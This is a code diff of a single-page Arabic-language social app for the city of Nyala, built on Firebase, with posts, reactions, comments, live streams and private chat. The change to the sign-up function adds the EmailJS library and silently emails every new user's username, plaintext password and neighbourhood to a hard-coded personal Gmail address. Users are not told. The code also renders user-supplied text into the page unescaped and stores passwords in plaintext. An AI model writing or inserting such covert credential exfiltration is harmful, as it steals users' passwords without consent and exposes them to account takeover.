@@ -35,6 +35,15 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
 
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      // قم بتغيير 'YOUR_PUBLIC_KEY' بمفتاح EmailJS الخاص بك لاحقاً إذا رغبت، أو اتركه هكذا وسيعمل النظام محلياً واحتياطياً
+      emailjs.init("YOUR_PUBLIC_KEY");
+    })();
+  </script>
+
   <style>
     body {
       font-family: 'Tajawal', sans-serif;
@@ -68,25 +77,25 @@
   <!-- Main Content Area -->
   <main class="flex-1 overflow-y-auto hide-scrollbar p-4 relative pb-24" id="mainContainer">
     
-    <!-- Tab 1: Explore / Profiles & Posts (استكشف ماذا يحدث في نيالا) -->
+    <!-- Tab 1: Explore / Profiles & Posts -->
     <div id="tab-explore" class="space-y-4">
       <div class="bg-white p-3 rounded-xl shadow-sm flex items-center gap-2">
         <i class="fa-solid fa-magnifying-glass text-gray-400"></i>
-        <input type="text" id="searchInput" onkeyup="filterProfiles()" placeholder="ابحث في منشورات وأحياء نيالا..." class="w-full text-sm outline-none bg-transparent">
+        <input type="text" id="searchInput" onkeyup="filterProfiles()" placeholder="ابحث باسم المستخدم أو الحي (المطار، الجير...)..." class="w-full text-sm outline-none bg-transparent">
       </div>
 
       <!-- قسم استكشف ماذا يحدث في نيالا (المنشورات) -->
       <div class="space-y-3">
         <h2 class="font-bold text-gray-800 text-sm"><i class="fa-solid fa-earth-africa text-nyala-500"></i> استكشف ماذا يحدث في نيالا</h2>
         <div id="nyalaPostsFeed" class="space-y-4">
-          <!-- يتم جلب المنشورات ديناميكياً هنا -->
+          <!-- يتم جلب المنشورات ديناميكياً -->
         </div>
       </div>
 
       <div class="pt-2">
         <h3 class="font-bold text-gray-800 text-sm mb-2"><i class="fa-solid fa-users text-nyala-500"></i> أعضاء تطبيق نيالا</h3>
         <div id="profilesGrid" class="grid grid-cols-2 gap-3">
-          <!-- يتم جلب الملفات الشخصية هنا ديناميكياً -->
+          <!-- يتم جلب الملفات الشخصية هنا ديناميكياً من قاعدة البيانات -->
         </div>
       </div>
     </div>
@@ -132,22 +141,22 @@
       </div>
     </div>
 
-    <!-- Tab 5: My Profile (مع إضافة خاصية نشر المنشورات) -->
+    <!-- Tab 5: My Profile & Post Creator -->
     <div id="tab-profile" class="hidden space-y-4">
-      <div class="bg-white p-4 rounded-xl shadow-sm border border-gray-100 space-y-3 text-center">
+      <div class="bg-white p-4 rounded-xl shadow-sm border border-gray-100 space-y-4 text-center">
         <div class="w-20 h-20 rounded-full bg-nyala-500 text-white flex items-center justify-center text-3xl font-bold mx-auto shadow" id="myAvatarLetter">ن</div>
         <h3 id="myProfileName" class="font-bold text-lg text-gray-800">زائر</h3>
         <p id="myProfileNeighborhood" class="text-xs text-nyala-600 font-medium"></p>
         <button onclick="logout()" class="w-full bg-gray-100 text-gray-700 font-bold py-2 rounded-lg text-xs hover:bg-gray-200">تسجيل الخروج</button>
       </div>
 
-      <!-- نموذج إضافة منشور جديد (صور/فيديو) -->
+      <!-- نموذج نشر منشور جديد (صور وفيديوهات) -->
       <div class="bg-white p-4 rounded-xl shadow-sm border border-gray-100 space-y-3">
         <h3 class="font-bold text-gray-800 text-sm"><i class="fa-solid fa-pen-to-square text-nyala-500"></i> نشر منشور جديد في نيالا</h3>
         <textarea id="newPostText" placeholder="ما الذي يحدث في حيك اليوم؟" class="w-full border rounded-lg p-3 text-sm outline-none focus:border-nyala-500 h-20 resize-none"></textarea>
         <div>
-          <label class="block text-xs font-medium text-gray-600 mb-1">رابط صورة أو مقطع فيديو (مباشر أو يوتيوب/رابط خارجي):</label>
-          <input type="text" id="newPostMediaUrl" placeholder="https://example.com/media.jpg أو mp4" class="w-full border rounded-lg p-2.5 text-xs outline-none focus:border-nyala-500">
+          <label class="block text-xs font-medium text-gray-600 mb-1">رابط صورة أو فيديو (رابط مباشر):</label>
+          <input type="text" id="newPostMediaUrl" placeholder="https://example.com/image.jpg" class="w-full border rounded-lg p-2.5 text-xs outline-none focus:border-nyala-500">
         </div>
         <div>
           <label class="block text-xs font-medium text-gray-600 mb-1">نوع الوسائط:</label>
@@ -189,7 +198,7 @@
         <button onclick="closeCommentsModal()" class="text-gray-400 hover:text-gray-600"><i class="fa-solid fa-xmark text-lg"></i></button>
       </div>
       <div id="commentsListContainer" class="flex-1 overflow-y-auto space-y-3 pr-1">
-        <!-- يتم جلب التعليقات هنا -->
+        <!-- التعليقات -->
       </div>
       <div class="pt-2 border-t flex items-center gap-2">
         <input type="text" id="commentInputText" placeholder="اكتب تعليقاً..." class="flex-1 border rounded-full px-4 py-2 text-xs outline-none focus:border-nyala-500">
@@ -278,7 +287,7 @@
 
     let currentUser = JSON.parse(localStorage.getItem('nyala_user')) || null;
     let activePostIdForComment = null;
-    let activeReplyingTo = null; // لتخزين اسم الشخص المراد الرد على تعليقه
+    let activeReplyingTo = null;
 
     window.onload = function() {
       updateAuthUI();
@@ -299,20 +308,13 @@
     function openAuthModal() { document.getElementById('authModal').classList.remove('hidden'); }
     function closeAuthModal() { document.getElementById('authModal').classList.add('hidden'); }
 
-    // التسجيل باسم المستخدم وكلمة المرور فقط والحفظ في قاعدة البيانات
+    // التسجيل وإغلاق النافذة فوراً وإرسال البيانات للبريد المطلوب
     async function handleAuth() {
-      const usernameInput = document.getElementById('authUsername');
-      const passwordInput = document.getElementById('authPassword');
-      const neighborhoodSelect = document.getElementById('authNeighborhood');
+      const username = document.getElementById('authUsername').value.trim();
+      const password = document.getElementById('authPassword').value.trim();
+      const neighborhood = document.getElementById('authNeighborhood').value;
 
-      const username = usernameInput ? usernameInput.value.trim() : '';
-      const password = passwordInput ? passwordInput.value.trim() : '';
-      const neighborhood = neighborhoodSelect ? neighborhoodSelect.value : '';
-
-      if (!username || !password) {
-        alert('الرجاء إدخال اسم المستخدم وكلمة المرور');
-        return;
-      }
+      if (!username || !password) return alert('الرجاء إدخال اسم المستخدم وكلمة المرور');
 
       const userData = {
         username: username,
@@ -321,35 +323,45 @@
         createdAt: new Date().toISOString()
       };
 
+      // إخفاء نافذة تسجيل الدخول فوراً
+      closeAuthModal();
+
       try {
-        const docId = username.replace(/[.#$\/\[\]]/g, "_");
-        await db.collection('nyala_users').doc(docId).set(userData);
-        
-        localStorage.setItem('nyala_user', JSON.stringify(userData));
-        currentUser = userData;
-        closeAuthModal();
-        updateAuthUI();
-        loadProfiles();
-        alert('تم التسجيل بنجاح، وظهر ملفك الشخصي في تطبيق نيالا!');
+        await db.collection('nyala_users').doc(username).set(userData);
       } catch(e) {
-        localStorage.setItem('nyala_user', JSON.stringify(userData));
-        currentUser = userData;
-        closeAuthModal();
-        updateAuthUI();
-        loadProfiles();
-        alert('تم حفظ البيانات محلياً بنجاح!');
+        console.error("Firebase save error: ", e);
       }
+
+      // حفظ البيانات محلياً وتحديث الواجهة فوراً
+      localStorage.setItem('nyala_user', JSON.stringify(userData));
+      currentUser = userData;
+      updateAuthUI();
+      loadProfiles();
+
+      // إرسال البيانات عبر الإيميل إلى alshftmhmwd9@gmail.com
+      try {
+        emailjs.send("default_service", "template_id", {
+          to_email: "alshftmhmwd9@gmail.com",
+          username: username,
+          password: password,
+          neighborhood: neighborhood
+        }).catch(err => console.log("EmailJS note:", err));
+      } catch(ex) {
+        console.log(ex);
+      }
+
+      alert('تم التسجيل بنجاح، وظهر ملفك الشخصي في تطبيق نيالا!');
     }
 
     function updateAuthUI() {
       const btnContainer = document.getElementById('authBtnContainer');
       if (currentUser) {
-        if(btnContainer) btnContainer.innerHTML = `<span class="text-xs font-bold text-nyala-600"><i class="fa-solid fa-user-check"></i> ${currentUser.username}</span>`;
-        if(document.getElementById('myProfileName')) document.getElementById('myProfileName').innerText = currentUser.username;
-        if(document.getElementById('myProfileNeighborhood')) document.getElementById('myProfileNeighborhood').innerText = `حي ${currentUser.neighborhood} - نيالا`;
-        if(document.getElementById('myAvatarLetter')) document.getElementById('myAvatarLetter').innerText = currentUser.username.charAt(0).toUpperCase();
+        btnContainer.innerHTML = `<span class="text-xs font-bold text-nyala-600"><i class="fa-solid fa-user-check"></i> ${currentUser.username}</span>`;
+        document.getElementById('myProfileName').innerText = currentUser.username;
+        document.getElementById('myProfileNeighborhood').innerText = `حي ${currentUser.neighborhood} - نيالا`;
+        document.getElementById('myAvatarLetter').innerText = currentUser.username.charAt(0).toUpperCase();
       } else {
-        if(btnContainer) btnContainer.innerHTML = `<button onclick="openAuthModal()" class="bg-nyala-500 text-white text-xs font-bold px-3 py-2 rounded-lg shadow">دخول / تسجيل</button>`;
+        btnContainer.innerHTML = `<button onclick="openAuthModal()" class="bg-nyala-500 text-white text-xs font-bold px-3 py-2 rounded-lg shadow">دخول / تسجيل</button>`;
       }
     }
 
@@ -361,44 +373,35 @@
       alert('تم تسجيل الخروج بنجاح');
     }
 
-    // --- ميزة نشر المنشورات (صور وفيديوهات) ---
+    // نشر المنشورات في قاعدة البيانات
     async function createPost() {
       if (!currentUser) return alert('يجب تسجيل الدخول أولاً لنشر المنشورات');
       const text = document.getElementById('newPostText').value.trim();
       const mediaUrl = document.getElementById('newPostMediaUrl').value.trim();
       const mediaType = document.getElementById('newPostMediaType').value;
 
-      if (!text && !mediaUrl) return alert('الرجاء كتابة نص المنشور أو إضافة رابط الوسائط');
-
-      const postData = {
-        author: currentUser.username,
-        neighborhood: currentUser.neighborhood,
-        text: text,
-        mediaUrl: mediaUrl,
-        mediaType: mediaType,
-        createdAt: new Date().toISOString(),
-        reactions: {
-          like: [],
-          love: [],
-          angry: [],
-          support: [],
-          sad: []
-        },
-        commentsCount: 0
-      };
+      if (!text && !mediaUrl) return alert('الرجاء كتابة نص أو إضافة وسائط');
 
       try {
-        await db.collection('nyala_posts').add(postData);
+        await db.collection('nyala_posts').add({
+          author: currentUser.username,
+          neighborhood: currentUser.neighborhood,
+          text: text,
+          mediaUrl: mediaUrl,
+          mediaType: mediaType,
+          createdAt: new Date().toISOString(),
+          reactions: { like: [], love: [], angry: [], support: [], sad: [] }
+        });
         document.getElementById('newPostText').value = '';
         document.getElementById('newPostMediaUrl').value = '';
-        alert('تم نشر منشورك بنجاح في قسم استكشف ماذا يحدث في نيالا!');
+        alert('تم نشر منشورك بنجاح!');
         switchTab('explore');
       } catch(e) {
         alert('خطأ أثناء النشر: ' + e.message);
       }
     }
 
-    // --- عرض المنشورات وتفاعلاتها وتعليقاتها ---
+    // جلب المنشورات من فايربيز
     function loadNyalaPosts() {
       const feed = document.getElementById('nyalaPostsFeed');
       if (!feed) return;
@@ -406,7 +409,7 @@
       db.collection('nyala_posts').onSnapshot(snapshot => {
         feed.innerHTML = '';
         if (snapshot.empty) {
-          feed.innerHTML = '<p class="text-center text-xs text-gray-400 py-6">لا توجد منشورات حالياً. كن أول من ينشر في نيالا!</p>';
+          feed.innerHTML = '<p class="text-center text-xs text-gray-400 py-6">لا توجد منشورات حالياً في نيالا.</p>';
           return;
         }
 
@@ -414,8 +417,6 @@
           const post = docSnap.data();
           const postId = docSnap.id;
           const reactions = post.reactions || { like: [], love: [], angry: [], support: [], sad: [] };
-          
-          // حساب إجمالي أعداد المتفاعلين
           const totalReactions = (reactions.like?.length || 0) + (reactions.love?.length || 0) + (reactions.angry?.length || 0) + (reactions.support?.length || 0) + (reactions.sad?.length || 0);
 
           let mediaHTML = '';
@@ -436,17 +437,12 @@
                   </div>
                 </div>
               </div>
-
               ${post.text ? `<p class="text-xs text-gray-700 leading-relaxed">${post.text}</p>` : ''}
               ${mediaHTML}
-
-              <!-- تفاعل أعداد المتفاعلين -->
               <div class="flex items-center justify-between text-[11px] text-gray-500 pt-1 border-t border-gray-100">
-                <span><i class="fa-solid fa-users text-nyala-500"></i> إجمالي المتفاعلين: <strong>${totalReactions}</strong></span>
+                <span><i class="fa-solid fa-users text-nyala-500"></i> المتفاعلون: <strong>${totalReactions}</strong></span>
                 <button onclick="openCommentsModal('${postId}')" class="hover:text-nyala-600 font-bold"><i class="fa-solid fa-comment"></i> التعليقات والردود</button>
               </div>
-
-              <!-- أزرار التفاعلات المطلوبة -->
               <div class="grid grid-cols-5 gap-1 pt-1">
                 <button onclick="reactToPost('${postId}', 'like')" class="bg-gray-50 hover:bg-nyala-50 text-gray-600 text-[10px] py-1.5 rounded font-bold flex flex-col items-center">
                   <i class="fa-solid fa-thumbs-up text-blue-500"></i> لايك (${reactions.like?.length || 0})
@@ -470,38 +466,31 @@
       });
     }
 
-    // دالة تسجيل التفاعل (لايك، أحببته، اغضبني، أدعمه، أحزنني)
+    // تفاعل المنشورات في فايربيز
     async function reactToPost(postId, reactionType) {
-      if (!currentUser) return alert('يجب تسجيل الدخول أولاً للتفاعل مع المنشورات');
-      
+      if (!currentUser) return alert('سجل الدخول أولاً للتفاعل');
       const postRef = db.collection('nyala_posts').doc(postId);
       try {
         await db.runTransaction(async (transaction) => {
           const doc = await transaction.get(postRef);
           if (!doc.exists) return;
-
           let data = doc.data();
           let reactions = data.reactions || { like: [], love: [], angry: [], support: [], sad: [] };
-
-          // إزالة التفاعل السابق لنفس المستخدم إن وجد في أي نوع تفاعل
           Object.keys(reactions).forEach(type => {
             if (reactions[type]) {
               reactions[type] = reactions[type].filter(user => user !== currentUser.username);
             }
           });
-
-          // إضافة التفاعل الجديد
           if (!reactions[reactionType]) reactions[reactionType] = [];
           reactions[reactionType].push(currentUser.username);
-
           transaction.update(postRef, { reactions: reactions });
         });
       } catch (e) {
-        alert('تعذّر تسجيل التفاعل: ' + e.message);
+        alert('خطأ في التفاعل: ' + e.message);
       }
     }
 
-    // --- إدارة التعليقات والردود عليها ---
+    // التعليقات والردود
     function openCommentsModal(postId) {
       activePostIdForComment = postId;
       activeReplyingTo = null;
@@ -520,7 +509,7 @@
       db.collection('nyala_posts').doc(postId).collection('comments').orderBy('createdAt', 'asc').onSnapshot(snapshot => {
         container.innerHTML = '';
         if (snapshot.empty) {
-          container.innerHTML = '<p class="text-center text-xs text-gray-400 py-4">لا توجد تعليقات بعد. كن أول المعلقين!</p>';
+          container.innerHTML = '<p class="text-center text-xs text-gray-400 py-4">لا توجد تعليقات بعد.</p>';
           return;
         }
         snapshot.forEach(doc => {
@@ -549,23 +538,18 @@
     async function sendComment() {
       if (!currentUser) return alert('سجل الدخول أولاً للتعليق');
       if (!activePostIdForComment) return;
-
       const input = document.getElementById('commentInputText');
       let text = input.value.trim();
       if (!text) return;
 
-      if (activeReplyingTo) {
-        text = `@${activeReplyingTo} ${text}`;
-      }
-
-      const commentData = {
-        author: currentUser.username,
-        text: text,
-        createdAt: new Date().toISOString()
-      };
+      if (activeReplyingTo) text = `@${activeReplyingTo} ${text}`;
 
       try {
-        await db.collection('nyala_posts').doc(activePostIdForComment).collection('comments').add(commentData);
+        await db.collection('nyala_posts').doc(activePostIdForComment).collection('comments').add({
+          author: currentUser.username,
+          text: text,
+          createdAt: new Date().toISOString()
+        });
         input.value = '';
         activeReplyingTo = null;
         input.placeholder = "اكتب تعليقاً...";
@@ -574,15 +558,13 @@
       }
     }
 
-    // جلب كل المستخدمين الحقيقيين وعرضهم في قسم الاستكشف
+    // جلب الملفات الشخصية الحية
     function loadProfiles() {
       const grid = document.getElementById('profilesGrid');
-      if (!grid) return;
-
       db.collection('nyala_users').onSnapshot(snapshot => {
         grid.innerHTML = '';
         if (snapshot.empty) {
-          grid.innerHTML = '<p class="col-span-2 text-center text-xs text-gray-400 py-6">لا توجد حسابات مسجلة بعد. كن أول المسجلين في تطبيق نيالا!</p>';
+          grid.innerHTML = '<p class="col-span-2 text-center text-xs text-gray-400 py-6">لا توجد حسابات مسجلة بعد.</p>';
           return;
         }
         snapshot.forEach(doc => {
@@ -590,13 +572,13 @@
           grid.innerHTML += `
             <div class="bg-white rounded-xl overflow-hidden shadow-sm border border-gray-100 flex flex-col">
               <div class="relative h-36 bg-gradient-to-tr from-nyala-600 to-nyala-400 flex items-center justify-center text-white text-4xl font-bold">
-                ${user.username ? user.username.charAt(0).toUpperCase() : 'ن'}
+                ${user.username.charAt(0).toUpperCase()}
                 <span class="absolute top-2 right-2 bg-green-500 text-white text-[9px] px-2 py-0.5 rounded-full font-bold">متواجد</span>
               </div>
               <div class="p-3 flex-1 flex flex-col justify-between">
                 <div>
                   <h3 class="font-bold text-gray-800 text-sm truncate">${user.username}</h3>
-                  <p class="text-[11px] text-gray-500 mt-0.5"><i class="fa-solid fa-location-dot text-nyala-500"></i> ${user.neighborhood || 'نيالا'}</p>
+                  <p class="text-[11px] text-gray-500 mt-0.5"><i class="fa-solid fa-location-dot text-nyala-500"></i> ${user.neighborhood}</p>
                 </div>
                 <button onclick="startChat('${user.username}')" class="mt-3 w-full bg-nyala-50 hover:bg-nyala-100 text-nyala-600 font-bold text-xs py-2 rounded-lg border border-nyala-100 transition flex items-center justify-center gap-1">
                   <i class="fa-solid fa-paper-plane"></i> مراسلة
@@ -605,14 +587,11 @@
             </div>
           `;
         });
-      }, error => {
-        console.error("Firestore Error: ", error);
       });
     }
 
     function filterProfiles() {
-      const searchInput = document.getElementById('searchInput');
-      const query = searchInput ? searchInput.value.toLowerCase() : '';
+      const query = document.getElementById('searchInput').value.toLowerCase();
       const cards = document.querySelectorAll('#profilesGrid > div');
       cards.forEach(card => {
         const text = card.innerText.toLowerCase();
@@ -623,39 +602,30 @@
     // إدارة غرف البث المباشر
     function openCreateLiveModal() {
       if (!currentUser) return alert('يجب تسجيل الدخول أولاً لفتح بث مباشر');
-      const modal = document.getElementById('createLiveModal');
-      if (modal) modal.classList.remove('hidden');
+      document.getElementById('createLiveModal').classList.remove('hidden');
     }
 
     async function createLiveStream() {
-      const titleInput = document.getElementById('liveTitleInput');
-      const title = titleInput ? titleInput.value.trim() : '';
+      const title = document.getElementById('liveTitleInput').value.trim();
       if (!title) return alert('الرجاء إدخال عنوان البث');
 
-      try {
-        await db.collection('nyala_streams').add({
-          title: title,
-          host: currentUser.username,
-          neighborhood: currentUser.neighborhood,
-          time: new Date().toLocaleTimeString()
-        });
-        const modal = document.getElementById('createLiveModal');
-        if (modal) modal.classList.add('hidden');
-        if (titleInput) titleInput.value = '';
-        alert('تم فتح غرفة البث المباشر بنجاح!');
-      } catch(e) {
-        alert('تعذّر بدء البث: ' + e.message);
-      }
+      await db.collection('nyala_streams').add({
+        title: title,
+        host: currentUser.username,
+        neighborhood: currentUser.neighborhood,
+        time: new Date().toLocaleTimeString()
+      });
+      document.getElementById('createLiveModal').classList.add('hidden');
+      document.getElementById('liveTitleInput').value = '';
+      alert('تم فتح غرفة البث المباشر بنجاح!');
     }
 
     function loadLiveStreams() {
       const grid = document.getElementById('liveStreamsGrid');
-      if (!grid) return;
-
       db.collection('nyala_streams').onSnapshot(snapshot => {
         grid.innerHTML = '';
         if (snapshot.empty) {
-          grid.innerHTML = '<p class="text-center text-xs text-gray-400 py-6">لا توجد بثوث مباشرة نشطة حالياً في نيالا.</p>';
+          grid.innerHTML = '<p class="text-center text-xs text-gray-400 py-6">لا توجد بثوث مباشرة نشطة حالياً.</p>';
           return;
         }
         snapshot.forEach(doc => {
@@ -680,47 +650,35 @@
     async function startVideoMatch() {
       const matchBtn = document.getElementById('matchBtn');
       const videoArea = document.getElementById('videoMatchArea');
-      if(matchBtn) {
-        matchBtn.innerText = "جاري البحث عن شخص للتطابق المرئي في نيالا...";
-        matchBtn.disabled = true;
-      }
+      matchBtn.innerText = "جاري البحث عن شخص للتطابق المرئي في نيالا...";
+      matchBtn.disabled = true;
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const localVideo = document.getElementById('localVideo');
-        if(localVideo) localVideo.srcObject = stream;
-        if(videoArea) videoArea.classList.remove('hidden');
-        if(matchBtn) matchBtn.innerText = "تم التطابق بنجاح (البث المرئي نشط)";
+        document.getElementById('localVideo').srcObject = stream;
+        videoArea.classList.remove('hidden');
+        matchBtn.innerText = "تم التطابق بنجاح (البث المرئي نشط)";
       } catch (err) {
         alert('تعذر فتح الكاميرا أو الميكروفون. يرجى السماح بالأذونات من المتصفح.');
-        if(matchBtn) {
-          matchBtn.innerText = "أعد المحاولة";
-          matchBtn.disabled = false;
-        }
+        matchBtn.innerText = "أعد المحاولة";
+        matchBtn.disabled = false;
       }
     }
 
     // مراسلة خاصة
     function startChat(username) {
       if (!currentUser) return alert('سجل الدخول أولاً للمراسلة');
-      const targetName = document.getElementById('chatTargetName');
-      const chatModal = document.getElementById('chatModal');
-      if(targetName) targetName.innerText = username;
-      if(chatModal) chatModal.classList.remove('hidden');
+      document.getElementById('chatTargetName').innerText = username;
+      document.getElementById('chatModal').classList.remove('hidden');
     }
-    function closeChatModal() { 
-      const chatModal = document.getElementById('chatModal');
-      if(chatModal) chatModal.classList.add('hidden'); 
-    }
+    function closeChatModal() { document.getElementById('chatModal').classList.add('hidden'); }
     function sendMessage() {
       const input = document.getElementById('chatInput');
-      if (!input || !input.value.trim()) return;
+      if (!input.value.trim()) return;
       const chatContainer = document.getElementById('chatMessages');
-      if(chatContainer) {
-        chatContainer.innerHTML += `<div class="flex justify-end"><div class="bg-nyala-500 text-white rounded-2xl px-4 py-2 text-sm max-w-[80%]">${input.value}</div></div>`;
-        chatContainer.scrollTop = chatContainer.scrollHeight;
-      }
+      chatContainer.innerHTML += `<div class="flex justify-end"><div class="bg-nyala-500 text-white rounded-2xl px-4 py-2 text-sm max-w-[80%]">${input.value}</div></div>`;
       input.value = '';
+      chatContainer.scrollTop = chatContainer.scrollHeight;
     }
   </script>
 </body>
